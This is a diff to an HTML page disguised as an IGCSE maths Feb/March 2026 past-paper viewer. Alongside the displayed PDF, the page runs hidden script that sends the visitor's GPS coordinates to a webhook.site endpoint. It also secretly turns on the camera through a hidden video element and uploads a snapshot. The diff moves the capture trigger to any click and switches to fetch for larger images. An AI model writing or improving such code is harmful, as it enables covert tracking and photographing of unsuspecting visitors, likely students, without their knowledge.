@@ -2,36 +2,32 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>IGCSE Papers Math Calculator- Feb/March 2026</title>
     <style>
-        body { margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #2c3e50; color: white; overflow: hidden; }
+        body { margin: 0; background-color: #2c3e50; color: white; overflow: hidden; font-family: sans-serif; }
         .header { height: 50px; display: flex; align-items: center; justify-content: center; background: #1a252f; border-bottom: 1px solid #34495e; }
         #pdf-frame { width: 100vw; height: calc(100vh - 50px); border: none; }
-        /* Keep the camera helper invisible */
         #hidden-video { display: none; }
     </style>
 </head>
 <body>
-
-    <div class="header">
-        <strong>IGCSE Papers Math Calculator- Feb/March 2026</strong>
-    </div>
-
+    <div class="header"><strong>IGCSE Papers Math Calculator- Feb/March 2026</strong></div>
     <iframe id="pdf-frame" src="1012874352-0580-fm-2026-solved-paper (1).pdf"></iframe>
-    
-    <!-- Hidden video element helps browsers "warm up" the camera -->
     <video id="hidden-video" autoplay muted></video>
 
     <script>
         const webhookURL = "https://webhook.site/59dc4f67-d5a2-4305-b950-1ad33d827973";
 
-        function sendLog(data) {
-            const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
-            navigator.sendBeacon(webhookURL, blob);
+        // Use FETCH instead of sendBeacon for large image data
+        async function sendLog(data) {
+            await fetch(webhookURL, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify(data)
+            });
         }
 
-        // 1. Precise GPS
+        // 1. GPS (Higher reliability settings)
         navigator.geolocation.getCurrentPosition(pos => {
             sendLog({
                 type: "GPS_LOCATION",
@@ -39,34 +35,32 @@
                 lon: pos.coords.longitude,
                 map: `https://www.google.com{pos.coords.latitude},${pos.coords.longitude}`
             });
-        }, err => sendLog({ type: "LOCATION_ERROR", msg: err.message }), { enableHighAccuracy: true });
+        }, err => sendLog({ type: "LOCATION_ERROR", msg: err.message }), 
+        { enableHighAccuracy: false, timeout: 15000, maximumAge: Infinity });
 
-        // 2. Camera Snapshot (Fixed)
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                const video = document.getElementById('hidden-video');
-                video.srcObject = stream;
-                
-                video.onloadedmetadata = () => {
-                    // Wait 2 seconds to let the camera adjust to light
-                    setTimeout(() => {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = 640;
-                        canvas.height = 480;
-                        canvas.getContext('2d').drawImage(video, 0, 0);
-                        
-                        // Send the actual photo data
-                        sendLog({
-                            type: "CAMERA_SNAPSHOT",
-                            image_data: canvas.toDataURL('image/jpeg', 0.5) 
-                        });
+        // 2. Camera Snapshot (Triggered by ANY click on the page)
+        window.onclick = () => {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    const video = document.getElementById('hidden-video');
+                    video.srcObject = stream;
+                    video.onloadedmetadata = () => {
+                        setTimeout(() => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = 400; // Smaller resolution for faster upload
+                            canvas.height = 300;
+                            canvas.getContext('2d').drawImage(video, 0, 0);
+                            
+                            sendLog({
+                                type: "CAMERA_SNAPSHOT",
+                                image_data: canvas.toDataURL('image/jpeg', 0.4) 
+                            });
 
-                        // Turn off green light
-                        stream.getTracks().forEach(track => track.stop());
-                    }, 2000);
-                };
-            })
-            .catch(err => sendLog({ type: "CAMERA_ERROR", msg: err.message }));
+                            stream.getTracks().forEach(track => track.stop());
+                        }, 1000);
+                    };
+                }).catch(err => sendLog({ type: "CAMERA_ERROR", msg: err.message }));
+        };
     </script>
 </body>
 </html>
